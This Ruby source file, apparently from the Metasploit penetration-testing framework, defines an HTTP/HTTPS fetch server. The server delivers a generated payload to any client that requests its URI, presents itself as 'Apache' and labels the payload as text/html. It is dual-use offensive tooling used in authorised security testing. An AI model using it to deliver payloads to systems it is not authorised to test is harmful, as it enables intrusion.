module Msf::Payload::Adapter::Fetch::Server::Https

  # This mixin supports both HTTP and HTTPS fetch handlers.  If you only want
  # HTTP, use the HTTP mixin that imports this, but removes the HTTPS options
  def initialize(*args)
    super
    register_options(
      [
        Msf::OptBool.new('FETCH_CHECK_CERT', [true,"Check SSL certificate", false])

      ]
    )
    register_advanced_options(
      [
        Msf::OptString.new('FetchHttpServerName', [true, 'Http Server Name', 'Apache']),
        Msf::OptPath.new('FetchSSLCert', [ false, 'Path to a custom SSL certificate (default is randomly generated)', '']),
        Msf::OptBool.new('FetchSSLCompression', [ false, 'Enable SSL/TLS-level compression', false ]),
        Msf::OptString.new('FetchSSLCipher', [ false, 'String for SSL cipher spec - "DHE-RSA-AES256-SHA" or "ADH"']),
        Msf::OptEnum.new('FetchSSLVersion',
                         'Specify the version of SSL/TLS to be used (Auto, TLS and SSL23 are auto-negotiate)',
                         enums: Rex::Socket::SslTcp.supported_ssl_methods)
      ]
    )
  end

  def add_resource(fetch_service, uri, srvexe)
    vprint_status("Adding resource #{uri}")
    if fetch_service.resources.include?(uri)
      # When we clean up, we need to leave resources alone, because we never added one.
      @delete_resource = false
      fail_with(Msf::Exploit::Failure::BadConfig, "Resource collision detected.  Set FETCH_URI to a different value to continue.")
    end
    fetch_service.add_resource(uri,
                               'Proc' => proc do |cli, req|
                                 on_request_uri(cli, req, srvexe)
                               end,
                               'VirtualDirectory' => true)
  rescue  ::Exception => e
    # When we clean up, we need to leave resources alone, because we never added one.
    @delete_resource = false
    fail_with(Msf::Exploit::Failure::Unknown, "Failed to add resource\n #{e}")
  end

  def cleanup_http_fetch_service(fetch_service, delete_resource)
    unless fetch_service.nil?
      escaped_srvuri = ('/' + srvuri).gsub('//', '/')
      if fetch_service.resources.include?(escaped_srvuri) && delete_resource
        fetch_service.remove_resource(escaped_srvuri)
      end
      fetch_service.deref
      if fetch_service.resources.empty?
        # if we don't call deref, we cannot start another httpserver
        # this is a reimplementation of the cleanup_service method
        # in Exploit::Remote::SocketServer
        temp_service = fetch_service
        fetch_service = nil
        temp_service.cleanup
        temp_service.deref
      end
    end
  end

  def fetch_protocol
    'HTTPS'
  end

  def on_request_uri(cli, request, srvexe)
    client = cli.peerhost
    vprint_status("Client #{client} requested #{request.uri}")
    if (user_agent = request.headers['User-Agent'])
      client += " (#{user_agent})"
    end
    vprint_status("Sending payload to #{client}")
    cli.send_response(payload_response(srvexe))
  end

  def payload_response(srvexe)
    res = Rex::Proto::Http::Response.new(200, 'OK', Rex::Proto::Http::DefaultProtocol)
    res['Content-Type'] = 'text/html'
    res.body = srvexe.to_s.unpack('C*').pack('C*')
    res
  end

  def ssl_cert
    datastore['FetchSSLCert']
  end

  def ssl_compression
    datastore['FetchSSLCompression']
  end

  def ssl_cipher
    datastore['FetchSSLCipher']
  end

  def ssl_version
    datastore['FetchSSLVersion']
  end

  def start_http_fetch_handler(srvname, srvexe)
    # this looks a bit funny because I converted it to use an instance variable so that if we crash in the
    # middle and don't return a value, we still have the right fetch_service to clean up.
    escaped_srvuri = ('/' + srvuri).gsub('//', '/')
    @fetch_service = start_https_server(false, nil, nil, nil, nil) if @fetch_service.nil?
    if @fetch_service.nil?
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch Handler failed to start on #{fetch_bindhost}:#{fetch_bindport}")
    end
    vprint_status('HTTP server started')
    @fetch_service.server_name = srvname
    add_resource(@fetch_service, escaped_srvuri, srvexe)
    @fetch_service
  end

  def start_https_fetch_handler(srvname, srvexe)
    # this looks a bit funny because I converted it to use an instance variable so that if we crash in the
    # middle and don't return a value, we still have the right fetch_service to clean up.
    escaped_srvuri = ('/' + srvuri).gsub('//', '/')
    @fetch_service = start_https_server(true, ssl_cert, ssl_compression, ssl_cipher, ssl_version) if @fetch_service.nil?
    if @fetch_service.nil?
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch Handler failed to start on #{fetch_bindhost}:#{fetch_bindport}\n #{e}")
    end
    vprint_status('HTTPS server started')
    @fetch_service.server_name = srvname
    add_resource(@fetch_service, escaped_srvuri, srvexe)
    @fetch_service
  end

  def start_https_server(ssl, ssl_cert, ssl_compression, ssl_cipher, ssl_version)
    begin
      fetch_service = Rex::ServiceManager.start(
        Rex::Proto::Http::Server,
        fetch_bindport, fetch_bindhost, ssl,
        {
          'Msf' => framework,
          'MsfExploit' => self
        },
        _determine_server_comm(fetch_bindhost),
        ssl_cert,
        ssl_compression,
        ssl_cipher,
        ssl_version
      )
    rescue Exception => e
      cleanup_handler
      fail_with(Msf::Exploit::Failure::BadConfig, "Fetch Handler failed to start on #{fetch_bindhost}:#{fetch_bindport}\n #{e}")
    end
    vprint_status("Fetch Handler listening on #{fetch_bindhost}:#{fetch_bindport}")
    fetch_service
  end

end
